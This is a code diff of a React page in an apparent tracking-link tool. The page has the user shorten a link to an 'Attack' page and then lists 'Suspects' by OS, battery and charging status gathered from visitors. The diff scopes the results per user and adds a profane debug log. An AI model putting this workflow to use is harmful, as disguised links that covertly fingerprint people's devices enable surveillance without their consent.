@@ -1,20 +1,29 @@
-import { useEffect, useState } from 'react';
+import { useContext, useEffect, useState } from 'react';
 import Header from '../components/Header';
 import { motion } from 'framer-motion';
 import Link from 'next/link';
-import shortenURL from './api/shorten';
-import Coordinates from '../components/Coordinates';
 import Head from 'next/head';
+import { DataContext } from '@/store/GlobalState';
 
 export default function Location() {
   const [originalURL, setOriginalUrl] = useState('');
   const [shortenedUrl, setShortenedURL] = useState('');
   const [suspects, setSuspects] = useState([]);
+  const { state = {}, dispatch } = useContext(DataContext)
+  const { auth = {} } = state
+  const [userName, setUserName] = useState("");
+
+  useEffect(() => {
+    if (auth && auth.user && auth.user.userName) {
+      setUserName(auth.user.userName);
+    }
+    console.log(userName, "this is my user bitch")
+  }, [auth]);
 
   useEffect(() => {
     const fetchBlogPosts = async () => {
       try {
-        const response = await fetch('/api/get-suspects');
+        const response = await fetch(`/api/get-suspects?userName=${userName}`);
         const data = await response.json();
         if (response.ok) {
           setSuspects(data.data);
@@ -84,12 +93,12 @@ export default function Location() {
         transition={{ duration: 0.8, ease: 'easeInOut' }}
         className=' mt-12 md:flex justify-evenly text-center'
       >
- 
+
 
         {/* <img src='/rto.png' className='h-full w-full md:block hidden rounded-3xl' /> */}
         <form className='mt-4 space-x-5' onSubmit={handleSubmit}>
           <h1 className='text-white  text-sm font-mono font-bold '>Copy the following link into the shortner: <br></br>
-            https://cdrgaruda.vercel.app/Attack</h1>
+            https://cdrgaruda.vercel.app/Attack?userName={userName}</h1>
           <input
             type="text"
             value={originalURL}
@@ -99,7 +108,7 @@ export default function Location() {
           />
           <button className='bg-[#1e7376] font-bold font-mono hover:bg-blue-700 text-white  mt-4 py-2  rounded-xl  md:p-4  px-4' type="submit">Submit</button>
         </form>
-        
+
         <div className='bg-[#00A79D] mt-4 md:w-[40%] w-fit  h-64 overflow-y-scroll overflow-scroll  text-center text-white rounded-2xl  '>
           <div className=' '>
             <h1 className='text-white font-mono text-2xl'>Suspects:</h1>
@@ -116,30 +125,30 @@ export default function Location() {
                   <h1 className='text-sm'>OS :{suspect.osDetails}</h1>
                   {suspect.charging ?
                     <h1>Battery :{suspect.battery} <br></br>
-                    Charging: {suspect.charging ? <span>YES</span>: <span>NO</span>}</h1>
+                      Charging: {suspect.charging ? <span>YES</span> : <span>NO</span>}</h1>
                     : <h1>No Battery Info</h1>}
                 </div>
               </div>
             ))}
-            
+
           </div>
         </div>
-        
+
 
       </motion.div>
 
       {shortenedUrl && (
-          <div className=' text-black bg-white  rounded-2xl py-2 w-fit ml-12 px-4 font-mono font-bold md:text-2xl text-sm'>
-            {shortenedUrl.error ? (
-              <p className='text-red-600 font-bold animate-pulse'>⚠️ Error Occurred!!!</p>
-            ) : (
-              <div>
-             <h1>Link:</h1>
-               <h1> {shortenedUrl.result_url}</h1> 
-             </div>
-            )}
-          </div>
-        )}
+        <div className=' text-black bg-white  rounded-2xl py-2 w-fit ml-12 px-4 font-mono font-bold md:text-2xl text-sm'>
+          {shortenedUrl.error ? (
+            <p className='text-red-600 font-bold animate-pulse'>⚠️ Error Occurred!!!</p>
+          ) : (
+            <div>
+              <h1>Link:</h1>
+              <h1> {shortenedUrl.result_url}</h1>
+            </div>
+          )}
+        </div>
+      )}
 
 
     </div>
